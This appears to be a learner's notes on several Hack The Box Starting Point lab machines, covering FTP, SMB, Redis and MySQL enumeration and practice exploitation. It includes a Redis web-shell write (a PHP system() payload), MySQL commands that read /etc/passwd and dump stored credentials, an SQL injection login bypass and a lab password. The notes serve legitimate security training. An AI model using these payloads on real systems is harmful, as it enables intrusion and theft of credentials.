
# 🧑‍💻 Hack The Box – Starting Point Machine Notes

This document contains notes and mini-writeups for several **Hack The Box Starting Point machines**.  
These machines introduce fundamental concepts in:

- Networking
- Enumeration
- Common services (FTP, SMB, Redis, MySQL)
- Basic exploitation techniques

---

# 🔐 Connecting to Hack The Box

HTB labs require a VPN connection.

## Connect using OpenVPN

```bash
sudo openvpn /path/to/file.ovpn
````

## Kill existing VPN sessions

If you already have another VPN running:

```bash
sudo pkill openvpn
```

---

# 🐱 Meow

## Tools Used

### Ping

Used to test connectivity using **ICMP Echo Request**.

```bash
ping <target-ip>
```

---

### Telnet

Telnet is an **old text-based protocol** used to communicate with remote systems over TCP.

⚠️ Telnet is **insecure** because traffic is not encrypted.

---

### FTP Secure

Secure version of FTP:

```
SFTP
```

---

### FTP Help

Display help menu:

```bash
ftp -?
```

---

# 🦌 Fawn

This machine introduces **FTP (File Transfer Protocol)**.

## FTP Basics

FTP uses **two channels**:

| Channel                   | Purpose                           |
| ------------------------- | --------------------------------- |
| Control Channel (Port 21) | Commands (USER, PASS, LIST, RETR) |
| Data Channel              | File transfers                    |

---

## FTP Modes

### 1️⃣ System Shell Mode

Executed directly from the terminal.

Example:

```bash
ftp -?
```

---

### 2️⃣ FTP Interactive Mode

Inside the FTP client:

```bash
ftp>
```

Regular system commands **do not work here**.

---

## Correct FTP Usage

### Step 1 – Start FTP

```bash
ftp <ip>
```

or

```bash
ftp
open <ip>
```

---

### Step 2 – Login

When prompted:

```
User (10.x.x.x:(none)):
```

Enter:

```
anonymous
```

or

```
ftp
```

For the password → **press Enter**.

---

### Step 3 – Useful FTP Commands

| Command      | Description            |
| ------------ | ---------------------- |
| help         | Show FTP commands      |
| ls / dir     | List files             |
| pwd          | Show current directory |
| cd folder    | Change directory       |
| get file.txt | Download file          |
| put file.txt | Upload file            |
| binary       | Binary transfer mode   |
| ascii        | Text transfer mode     |
| bye / quit   | Exit FTP               |

---

# 💃 Dancing

Introduces **SMB (Server Message Block)**.

## SMB Overview

SMB is used for **file and resource sharing** in Windows networks.

Think of SMB as:

```
FTP + authentication + Windows integration
```

---

## Common SMB Ports

| Port | Description                      |
| ---- | -------------------------------- |
| 445  | Modern SMB                       |
| 139  | SMB over NetBIOS (older systems) |

If these ports appear in scans → **SMB may be exploitable**.

---

## Enumerating SMB

```bash
smbclient -L <ip> -N
```

Options:

| Option | Meaning         |
| ------ | --------------- |
| `-L`   | List shares     |
| `-N`   | Anonymous login |

Example:

```bash
smbclient -L 10.129.56.193 -N
```

---

## SMBClient Commands

Inside `smbclient`, commands are similar to FTP:

```
ls
cd
get
put
```

---

# 💰 Redeemer

Introduces **Redis**.

## Redis Overview

Redis stands for:

```
REmote DIctionary Server
```

It is a **key-value NoSQL database**.

Common uses:

* Session storage
* Caching
* Message broker
* Temporary data storage

---

## Default Redis Port

```
6379
```

Config file:

```
redis.conf
```

---

## Redis Enumeration

Connect using:

```bash
redis-cli -h <ip>
```

---

## Basic Redis Commands

| Command          | Description             |
| ---------------- | ----------------------- |
| INFO             | Show server information |
| KEYS *           | List all keys           |
| SCAN 0           | Safer key listing       |
| GET key          | Get value               |
| HGETALL hash     | Get hash data           |
| LRANGE list 0 -1 | Read lists              |

Example:

```bash
GET flag
```

---

## Redis Exploitation (Writing Web Shell)

### Step 1 – Check write permissions

```bash
CONFIG GET dir
CONFIG GET dbfilename
```

---

### Step 2 – Change save location

Example targeting a web directory:

```bash
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
```

---

### Step 3 – Write malicious file

```bash
SET x "<?php system($_GET['cmd']); ?>"
SAVE
```

---

### Step 4 – Access Web Shell

```
http://target/shell.php?cmd=id
```

---

## Redis Files Worth Stealing

| File           | Description       |
| -------------- | ----------------- |
| dump.rdb       | Database snapshot |
| appendonly.aof | Command log       |

Example download:

```bash
scp user@target:/var/lib/redis/dump.rdb .
```

---

# 🔎 Web Enumeration

Tool used:

```
feroxbuster
```

Example scan:

```bash
feroxbuster \
-u http://10.129.12.18 \
-w /snap/seclists/current/Discovery/Web-Content/raft-medium-directories.txt
```

---

## Packet Capture Analysis

If a **pcap file** is discovered:

Use:

```
Wireshark
```

---

Example result:

Found credentials:

```
user: nathan
password: Buck3tH4TF0RM3!
```

Login via SSH:

```bash
ssh nathan@10.129.12.18
```

---

## Privilege Escalation

Search for binaries with special capabilities:

```bash
getcap -r / 2>/dev/null
```

Look for the **root flag** in:

```
/root
```

---

# 📅 Appointment

This machine demonstrates **SQL Injection**.

Example login bypass:

```
username: admin' #
password: anything
```

---

# 🧬 Sequel

Introduces **MySQL database interaction**.

## If Nmap Doesn't Show Version

Try connecting manually:

```bash
nc <ip> <port>
```

Or use Nmap scripts:

```bash
nmap -sC -sV <ip>
```

---

## MySQL Basic Commands

### Select Database

```sql
USE database_name;
```

---

### Show Tables

```sql
SHOW TABLES;
```

---

### View Table Structure

```sql
SHOW COLUMNS FROM table_name;
```

---

### Read Data

```sql
SELECT * FROM table_name;
SELECT username, password FROM users;
SELECT * FROM users WHERE username='admin';
SELECT * FROM users WHERE password IS NOT NULL;
SELECT * FROM users WHERE username LIKE '%admin%';
```

---

### Modify Data (If Privileged)

```sql
UPDATE users SET password='newpass' WHERE username='admin';
```

---

### Delete Rows

```sql
DELETE FROM users WHERE id=5;
```

---

### Identify Current User

```sql
SELECT USER();
SELECT CURRENT_USER();
```

---

### Show Privileges

```sql
SHOW GRANTS;
```

---

### Read System Files

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/etc/hosts');
```

---

### Write Files (Web Shell)

```sql
SELECT 'test' INTO OUTFILE '/tmp/pwned.txt';
```

---

### Retrieve Credentials

```sql
SELECT * FROM mysql.user;
```

---

### Rare Command Execution

```sql
\! command
```

(Some MySQL clients allow shell execution.)

---

# 🧠 Skills Practiced

Through these machines I practiced:

* Network service enumeration
* FTP and SMB interaction
* Redis exploitation
* Web enumeration
* Packet capture analysis
* SQL injection
* MySQL database exploration
* Basic privilege escalation

These concepts are foundational for **penetration testing and CTF competitions**.

